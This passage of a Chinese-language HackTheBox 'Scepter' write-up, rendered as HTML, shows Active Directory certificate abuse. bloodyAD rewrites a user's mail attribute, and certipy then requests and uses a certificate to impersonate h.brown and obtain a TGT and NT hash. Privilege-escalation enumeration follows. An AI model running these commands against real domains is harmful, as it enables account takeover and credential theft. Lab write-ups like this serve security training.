+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ bloodyAD --host $ip -d scepter.htb -u $user1 -p $pass1 set object d.baker mail -v h.brown@scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; d.baker&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;s mail has been updated
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;以d.baker身份请求证书&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ certipy req -username d.baker@scepter.htb -hashes :$hash -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip $ip
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certipy v5.0.3 - by Oliver Lyak &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ly4k&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Requesting certificate via RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Request ID is &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Successfully requested certificate
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Got certificate without identity
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Certificate has no object SID
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Try using -sid to set the object SID or see the wiki &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; more details
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Saving certificate and private key to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d.baker.pfx&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Wrote certificate and private key to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d.baker.pfx&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;以这个证书去认证h.brown&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ certipy auth -pfx d.baker.pfx -dc-ip $ip -domain scepter.htb -username h.brown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certipy v5.0.3 - by Oliver Lyak &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ly4k&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Certificate identities:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;     No identities found in this certificate
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Could not find identity in the provided certificate
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Using principal: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;h.brown@scepter.htb&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying to get TGT...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Got TGT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Saving credential cache to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;h.brown.ccache&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Wrote credential cache to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;h.brown.ccache&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying to retrieve NT hash &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;h.brown&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Got hash &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;h.brown@scepter.htb&amp;#39;&lt;/span&gt;: aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当设置altSecurityIdentities属性后，证书认证会变成弱匹配，只要证书属性中关于这个属性的值匹配一致，则允许认证&lt;/p&gt;
+&lt;h2 id=&#34;提权&#34;&gt;提权
+&lt;/h2&gt;&lt;p&gt;此用户不允许ntlm认证，请求tgt登陆winrm之前看看猎犬&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image-4.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;属于的组多，但是并没有发现有意思的&lt;/p&gt;
+&lt;p&gt;查看证书，也没有什么东西&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ certipy find -target $FQDN -u $user2@$domain -no-pass -k -vulnerable -stdout -dc-ip $ip
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certipy v5.0.3 - by Oliver Lyak &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ly4k&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding certificate authorities
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; certificate authority
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; enabled certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding issuance policies
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; issuance policies
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; OIDs linked to templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Retrieving CA configuration &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;scepter-DC01-CA&amp;#39;&lt;/span&gt; via RRP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Failed to connect to remote registry. Service should be starting now. Trying again...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Successfully retrieved CA configuration &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;scepter-DC01-CA&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Checking web enrollment &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; CA &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;scepter-DC01-CA&amp;#39;&lt;/span&gt; @ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dc01.scepter.htb&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Error checking web enrollment: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Errno 111&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Connection refused
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Use -debug to print a stacktrace
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Error checking web enrollment: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Errno 111&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Connection refused
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Use -debug to print a stacktrace
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Enumeration output:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certificate Authorities
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CA Name                             : scepter-DC01-CA
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DNS Name                            : dc01.scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Subject                 : CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter-DC01-CA, DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter, DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Serial Number           : 716BFFE1BE1CD1A24010F3AD0E350340
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Validity Start          : 2024-10-31 22:24:19+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Validity End            : 2061-10-31 22:34:19+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Web Enrollment
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      HTTP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enabled                         : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      HTTPS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enabled                         : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    User Specified SAN                  : Disabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Request Disposition                 : Issue
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Enforce Encryption &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; Requests     : Enabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Permissions
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Owner                             : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrators
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Access Rights
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ManageCa                        : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrators
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ManageCertificates              : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrators
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enroll                          : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;uthenticated Users
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certificate Templates                   : &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Could not find any certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看这个用户可写内容&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ bloodyAD --host $FQDN --dc-ip $ip -d $domain -u $user2 -k get writable --detail
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;distinguishedName: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;S-1-5-11,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ForeignSecurityPrincipals,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;url: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wWWHomePage: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;distinguishedName: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;h.brown,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Users,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;thumbnailPhoto: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pager: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mobile: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;homePhone: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;userSMIMECertificate: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-ExternalDirectoryObjectId: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute20: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute19: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute18: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute17: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute16: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute15: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute14: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute13: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute12: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute11: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute10: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute9: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute8: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute7: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute6: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute5: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute4: WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-cloudExtensionAttribute3: WRITE
